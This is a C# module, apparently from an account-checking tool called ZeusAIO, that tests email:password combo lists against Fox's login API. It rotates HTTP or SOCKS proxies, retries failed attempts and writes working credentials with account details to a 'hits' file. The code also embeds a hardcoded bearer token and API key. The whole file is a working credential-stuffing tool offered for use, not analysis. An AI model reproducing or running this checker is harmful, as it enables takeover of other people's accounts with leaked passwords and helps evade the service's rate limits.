using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Fox
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.AddHeader("authorization", "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg5REEwNkVEMjAxOCIsInR5cCI6IkpXVCJ9.eyJwaWQiOiJ3ZWI3MmQxMTI5MS0yNjM1LTQ3M2YtYTE0MC1jNjYwYzJkZWY1ZDkiLCJ1aWQiOiJkMlZpTnpKa01URXlPVEV0TWpZek5TMDBOek5tTFdFeE5EQXRZelkyTUdNeVpHVm1OV1E1Iiwic2lkIjoiMzcyZGViMWYtNTU5Yi00N2UyLWJkZjAtOTEzMzk4N2JhYzE2Iiwic2RjIjoidXMtZWFzdC0xIiwiYXR5cGUiOiJhbm9ueW1vdXMiLCJkdHlwZSI6IndlYiIsInV0eXBlIjoiZGV2aWNlSWQiLCJkaWQiOiI3MmQxMTI5MS0yNjM1LTQ3M2YtYTE0MC1jNjYwYzJkZWY1ZDkiLCJtdnBkaWQiOiIiLCJ2ZXIiOjIsImV4cCI6MTYzMTUzMjcxNiwianRpIjoiNmM2NmM5YTEtODYzOS00NWIxLWJlYTgtOGNjOGY3OGVkNWZlIiwiaWF0IjoxNTk5OTk2NzE2fQ.hXHKh4tAZ4rLbPsqmFDA99TIThN79ZUZSAlC8S0zSIqnItxRoimOO81edPwuG00rE4O4GNsTKxYxZldFo54P0jcCS4UmRAZoEG0t14T5l0wMoMfdWqJj3elx-aF1QKM8BFWj41LdaTIgCj8xv7n5Xf8LLS3Ibcq7JpLNA1HTrON7nWHvsAge4UpF4C1a3kXS8RPN0VnsFCVgbZOyvH7WXva530unsNFDgt3pfWqua2ukmUwe9YV28hnWXSNzsmzMKecIIp8gYpyEuaJOmiL1lW68PulhqYcsm3wKG0sPvvjfh-7xyveJp1pb5r87OYzWwA1PVjYAE7HZQnnlflNWOg");
                            httpRequest.AddHeader("x-api-key", "6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9");
                            httpRequest.AddHeader("x-dcg-udid", "72d11291-2635-473f-a140-c660c2def5d9");
                            httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
                            string str = "{\"password\":\"" + s[1] + "\",\"email\":\"" + s[0] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://api3.fox.com/v2.0/login", str, "application/json;charset=UTF-8").ToString();
                            {
                                if (strResponse.Contains("Invalid login credentials"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("accessToken")) //hit
                                {
                                    string AccountType = Check.Parse(strResponse, "accountType\":\"", "\",\"");
                                    string Brand = Check.Parse(strResponse, "brand\":\"", "\",\"");
                                    string Platform = Check.Parse(strResponse, "platform\":\"", "\",\"");
                                    string Device = Check.Parse(strResponse, "device\":\"", "\",\"");
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - FOX] " + s[0] + ":" + s[1] + " | Account Type: " + AccountType + " | Brand: " + Brand + " | Platform: " + Platform + " | Device: " + Device, Color.Green);
                                    }
                                    Export.AsResult("/Fox_hits", s[0] + ":" + s[1] + " | Account Type: " + AccountType + " | Brand: " + Brand + " | Platform: " + Platform + " | Device: " + Device);
                                    return false;

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

